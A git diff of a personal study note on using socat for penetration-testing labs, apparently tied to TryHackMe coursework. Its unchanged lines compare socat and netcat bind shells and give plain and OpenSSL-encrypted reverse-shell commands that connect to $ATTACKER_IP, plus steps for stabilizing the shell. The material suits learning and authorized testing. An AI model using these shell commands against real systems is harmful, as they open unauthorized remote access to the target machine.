@@ -1,11 +1,11 @@
-# Using “socat”
+# Using "socat"
 
 author:: Nathan Acks  
 date:: 2021-10-28
 
 Socat: An anything-to-anything connector!
 
-## “socat” vs. “netcat”
+## "socat" vs. "netcat"
 
 Equivalent commands between socat and netcat:
 
@@ -16,7 +16,7 @@ Equivalent commands between socat and netcat:
 | Bind shell (attacker)    | `nc $TARGET_IP $LISTENER_PORT`              | `socat TCP:$TARGET_IP:$LISTENER_PORT`                      |
 | Bind shell (target)      | `nc -lnp $LISTENER_PORT -e /bin/bash`        | `socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"`      |
 
-Socat gets us an interactive login shell right out the gate, though we’re still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.
+Socat gets us an interactive login shell right out the gate, though we're still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.
 
 ### Socat Encrypted Shells
 
@@ -45,11 +45,11 @@ socat \
 	EXEC:"/bin/bash -li"
 ```
 
-The `verify=0` directive turns off certificate validation, so this isn’t a “secure” connection in the sense that it’s been *authenticated*, but it is secure in the sense that it’s *encrypted*.
+The `verify=0` directive turns off certificate validation, so this isn't a "secure" connection in the sense that it's been *authenticated*, but it is secure in the sense that it's *encrypted*.
 
-## Shell “Stabilization”
+## Shell "Stabilization"
 
-Shell “stabilization” refers to the process of making a remote shell behave like a normal local shell — so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.
+Shell "stabilization" refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.
 
 We can use socat to create an auto-stabilized reverse shell on UNIX-like systems.
 
@@ -67,8 +67,8 @@ socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0
 #     stderr - redirect STDERR to the attacker
 #     sigint - pass signals (Ctrl+C) through
 #     setsid - use a new session
-#     sane   - use a variety of tweaks to “normalize” the
-#              terminal’s environment
+#     sane   - use a variety of tweaks to "normalize" the
+#              terminal's environment
 #
 socat TCP:$ATTACKER_IP:$LISTENER_PORT \
       EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
@@ -92,17 +92,17 @@ socat \
 #     stderr - redirect STDERR to the attacker
 #     sigint - pass signals (Ctrl+C) through
 #     setsid - use a new session
-#     sane   - use a variety of tweaks to “normalize” the
-#              terminal’s environment
+#     sane   - use a variety of tweaks to "normalize" the
+#              terminal's environment
 #
 socat \
 	OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
 	EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
 ```
 
-NOTE that the reverse shell will not pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.
+NOTE that the reverse shell will not pick up on your terminal size, so you'll need to manually specify it using `stty rows` and `stty cols`.
 
 ## References
 
 * [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
-* [Using “netcat”](netcat.md)
+* [Using "netcat"](netcat.md)
